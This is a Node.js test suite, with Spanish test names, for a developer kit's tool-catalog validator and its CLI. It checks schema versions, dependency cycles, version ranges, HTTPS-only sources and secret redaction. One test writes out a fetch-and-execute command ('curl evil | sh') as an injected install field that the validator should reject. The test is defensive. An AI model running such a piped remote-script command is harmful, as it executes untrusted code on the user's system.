'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const path = require('node:path');
const { readToolCatalog, validateToolCatalog, doctorCatalog, dependencyDetails, selectTool, listTools } = require('../../scripts/tools/catalog');
const { diagnose } = require('../../scripts/doctor/environment');
const legacy = require('../../config/kit-capabilities.json');
const original = readToolCatalog();
const fresh = () => structuredClone(original);
const tool = (data, id) => data.tools.find(t => t.id === id);
const cli = path.resolve(__dirname, '../../scripts/kit.js');
const run = (...args) => spawnSync(process.execPath, [cli, ...args], { encoding: 'utf8', timeout: 15000 });
const invalid = data => { const result = validateToolCatalog(data, legacy); assert.equal(result.ok, false); return result; };

test('catálogo versionado conserva los diagnósticos y perfiles anteriores', () => {
  const report = validateToolCatalog(original, legacy);
  assert.equal(report.ok, true); assert.equal(report.tools, 80); assert.equal(report.diagnostics, 22);
  assert.equal(report.catalogVersion, '1.0.0');
  for (const [id, old] of Object.entries(legacy.tools)) {
    assert.deepEqual(tool(original, id).diagnostic, old);
  }
});
test('rechaza versión de esquema desconocida, campos ejecutables y entradas duplicadas', () => {
  const a = fresh(); a.schemaVersion = 99; invalid(a);
  const b = fresh(); tool(b, 'node').install = 'curl evil | sh'; invalid(b);
  const c = fresh(); c.tools.push(structuredClone(c.tools[0])); assert.match(invalid(c).errors.join(), /duplicado/);
});
test('no acepta argumentos de instalación como diagnóstico', () => {
  const data = fresh(); tool(data, 'npm').diagnostic.args = ['install', 'anything']; invalid(data);
});
test('solo admite fuentes HTTPS sin credenciales ni parámetros sensibles', () => {
  for (const url of ['http://example.com/docs', 'https://user:secret@example.com/docs', 'https://example.com/?token=my-private-token', 'https://127.0.0.1/docs', 'https://server.local/docs']) {
    const data = fresh(); tool(data, 'git').sources[0].url = url;
    const result = invalid(data); assert.ok(!JSON.stringify(result).includes('my-private-token')); assert.ok(!JSON.stringify(result).includes('user:secret'));
  }
});
test('rangos vacíos o sin intersección con majors son rechazados', () => {
  for (const requirement of [{ min: '26', maxExclusive: '24' }, { min: '22', maxExclusive: '23', majors: [24] }]) {
    const data = fresh(); tool(data, 'node').versionPolicy.requirement = requirement;
    assert.match(invalid(data).errors.join(), /rango de versiones vacío/);
  }
});
test('una regla no puede inventar evidencia o fecha de revisión', () => {
  const a = fresh(); tool(a, 'go').versionPolicy.evidence = 'https://example.com/not-declared'; assert.match(invalid(a).errors.join(), /evidencia/);
  const b = fresh(); tool(b, 'go').versionPolicy.reviewedAt = '2026-02-30'; invalid(b);
  const c = fresh(); tool(c, 'go').versionPolicy.reviewedAt = '2027-01-01'; assert.match(invalid(c).errors.join(), /posterior/);
});
test('un estado unassessed no puede llevar requisitos ocultos', () => {
  const data = fresh(); tool(data, 'java').versionPolicy.requirement = { min: '17' }; invalid(data);
});
test('dependencias deben existir, sin autorreferencias ni duplicados', () => {
  for (const dependencies of [[{ id: 'absent-tool', reason: 'x' }], [{ id: 'git', reason: 'x' }], [{ id: 'node', reason: 'x' }, { id: 'node', reason: 'y' }]]) {
    const data = fresh(); tool(data, 'git').dependencies = dependencies; invalid(data);
  }
  const data = fresh(); tool(data, 'npm').optionalDependencies.push({ id: 'node', reason: 'x' }); invalid(data);
});
test('rechaza ciclos obligatorios y permite relaciones opcionales de ecosistema', () => {
  const data = fresh(); tool(data, 'node').dependencies = [{ id: 'npm', reason: 'cycle' }];
  assert.match(invalid(data).errors.join(), /ciclo/);
  assert.equal(validateToolCatalog(original, legacy).ok, true); // Go optionally recommends tools that require Go.
});
test('rechaza conflictos transitivos y conjuntos sin plataforma común', () => {
  const a = fresh(); tool(a, 'react').dependencies = [{ id: 'npm', reason: 'x' }]; tool(a, 'react').conflicts = ['node'];
  assert.match(invalid(a).errors.join(), /conflicto/);
  const b = fresh(); tool(b, 'xcode').dependencies = [{ id: 'winget', reason: 'impossible' }];
  assert.match(invalid(b).errors.join(), /plataforma común/);
});
test('impide divergencia silenciosa entre manifiesto nuevo y comandos heredados', () => {
  const data = fresh(); tool(data, 'npm').diagnostic.command = 'another-command';
  assert.match(invalid(data).errors.join(), /diagnóstico divergente/);
});
test('resumen de dependencias no fuerza alternativas opcionales ni inventa un plan', () => {
  const report = dependencyDetails(original, 'govulncheck');
  assert.deepEqual(report.requiredClosure, ['go']); assert.equal(report.scope, 'metadata-only');
  const go = dependencyDetails(original, 'go'); assert.deepEqual(go.requiredClosure, []); assert.ok(go.optionalDependencies.some(d => d.id === 'git'));
  assert.throws(() => dependencyDetails(original, 'not-found'), /desconocida/);
});
test('cliente PostgreSQL y servidor son entradas independientes', () => {
  assert.equal(selectTool(original, 'postgresql').kind, 'database-client');
  assert.equal(selectTool(original, 'postgresql-server').kind, 'database-service');
  assert.deepEqual(dependencyDetails(original, 'postgresql').requiredClosure, []);
});
test('filtrado del catálogo mantiene separadas documentación y diagnóstico', () => {
  const result = listTools(original, 'project-package'); assert.ok(result.count > 0);
  assert.ok(result.tools.every(t => t.kind === 'project-package' && t.availability === 'documented'));
  assert.throws(() => listTools(original, 'not-a-kind'), /desconocida/);
});
test('reglas declaradas se integran en doctor sin perder la política Go', () => {
  const definitions = doctorCatalog(legacy, original);
  assert.deepEqual(definitions.tools.go.requirement, { min: '1.26', maxExclusive: '1.28' });
  const report = diagnose(definitions, { tools: ['node'] }, {
    platform: 'linux', env: { PATH: '/tools' }, arch: 'x64', machine: 'x86_64', release: '6.8', cwd: '/work',
    stat(file) { if (file === '/tools/node') return { isFile: () => true }; throw new Error('missing'); },
    access() {}, read() { throw new Error('not available'); },
    spawn() { return { status: 0, stdout: 'v25.2.1' }; }
  });
  assert.equal(report.checks[0].status, 'incompatible'); assert.equal(report.ok, false);
});
test('CLI tools lista, consulta y valida sin ejecutar herramientas', () => {
  for (const args of [['tools','list','--json'], ['tools','show','go','--json'], ['tools','dependencies','npm','--json'], ['tools','validate','--json']]) {
    const result = run(...args); assert.equal(result.status, 0, result.stderr); assert.equal(JSON.parse(result.stdout).catalogVersion, '1.0.0');
  }
});
test('CLI de metadatos funciona con PATH vacío', () => {
  const result = spawnSync(process.execPath, [cli, 'tools', 'list', '--json'], { encoding: 'utf8', env: { ...process.env, PATH: '' }, timeout: 15000 });
  assert.equal(result.status, 0); assert.equal(JSON.parse(result.stdout).count, 80);
});
test('CLI rechaza instalar, consultar IDs arbitrarios o diagnosticar paquetes documentados', () => {
  for (const args of [['tools','install','go'], ['tools','show','../secretos'], ['tools','list','--kind','unknown'], ['doctor','--tool','react']]) {
    assert.equal(run(...args).status, 1, args.join(' '));
  }
});
test('una palabra de subcomando no se acepta como archivo a ejecutar con Python', () => {
  const data = fresh(); tool(data, 'python').diagnostic.args = ['version'];
  assert.match(invalid(data).errors.join(), /no segura/);
});
test('CLI aislado bloquea un manifiesto inválido antes del diagnóstico y no expone JSON', () => {
  const fs = require('node:fs'), os = require('node:os');
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'canedo-catalog-rejection-'));
  const root = path.resolve(__dirname, '../..');
  try {
    for (const relative of ['scripts/kit.js','scripts/doctor/environment.js','scripts/tools/catalog.js','schemas/tool-catalog.schema.json','config/kit-capabilities.json']) {
      const target = path.join(fixtureRoot, relative); fs.mkdirSync(path.dirname(target), { recursive: true }); fs.copyFileSync(path.join(root, relative), target);
    }
    const manifestFile = path.join(fixtureRoot, 'catalog/tools/manifest.json'); fs.mkdirSync(path.dirname(manifestFile), { recursive: true });
    const invalidData = fresh(); tool(invalidData, 'node').diagnostic.args = ['install', 'anything'];
    for (const content of [JSON.stringify(invalidData), '{"secret":"fixture-private-value"']) {
      fs.writeFileSync(manifestFile, content);
      const result = spawnSync(process.execPath, [path.join(fixtureRoot, 'scripts/kit.js'), 'doctor', '--tool', 'node', '--json'], {
        encoding: 'utf8', timeout: 15000, cwd: fixtureRoot,
        env: { ...process.env, PATH: '', NODE_PATH: path.dirname(path.dirname(require.resolve('ajv/package.json'))) }
      });
      assert.equal(result.status, 1, result.stderr); assert.equal(result.stdout, '');
      assert.ok(!result.stderr.includes('fixture-private-value'));
      assert.match(result.stderr, /Catálogo de herramientas inválido|manifiesto JSON/);
    }
  } finally { fs.rmSync(fixtureRoot, { recursive: true, force: true }); }
});
